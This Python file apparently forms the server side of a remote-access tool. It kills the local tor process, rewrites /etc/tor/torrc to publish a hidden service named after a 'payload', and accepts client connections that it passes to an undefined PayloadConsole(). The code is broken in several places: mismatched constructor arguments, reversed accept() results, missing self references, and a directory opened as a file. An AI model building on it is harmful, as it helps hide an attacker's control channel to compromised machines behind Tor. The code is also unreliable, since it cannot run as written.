import socket
import threading
import os
import subprocess

def GetTorPid():
    open("tmp.txt", 'w').close()
    os.system("ps -A | grep -w tor >> tmp.txt")
    for lines in open('tmp.txt','r'):
        return lines[1:5]
        
    
def CreateHiddenService(port,payload):
    f = open("Sources/torrc",'r')
    os.system("cp /etc/tor/torrc /etc/tor/torrc.copy")
    os.system("rm /etc/tor/torrc")
    torrc = open("/etc/tor/torrc",'w')
    counter = 1
    for lines in f:
        if counter == 72:
            torrc.write("HiddenServiceDir ~/hidden_service/" + payload + "/")
        if counter == 73:
            torrc.write("HiddenServicePort "+port+" 127.0.0.1:"+port)
        else:
            torrc.write(lines)
    torrc.close()
    f.close()
    os.system("tor")

def GetHostName(payload):
    f = open("~/hidden_service/" + payload + "/")
    for line in f:
        return line


def run(payload,port):
    pid = GetTorPid()
    os.system("kill " + pid)
    CreateHiddenService(port,payload)
    rhost = GetHostName(payload)
    s = Server(port)
    s.start()


class Server:

    def __init__(self,port,payload):
        self.sock = socket.socket()
        self.addr = GetHostName(payload)
        self.port = port
        self.clients = {}

    def run(self):
        self.sock.bind((self.addr,self.port))
        self.sock.listen(5)
        while 1:
            addr,conn = sock.accept()
            handler(client(addr,conn))

    def handler(self,cli):
        PayloadConsole()
    

class client:

    def __init__(self,addr,conn):
        self.addr = addr
        self.conn = conn
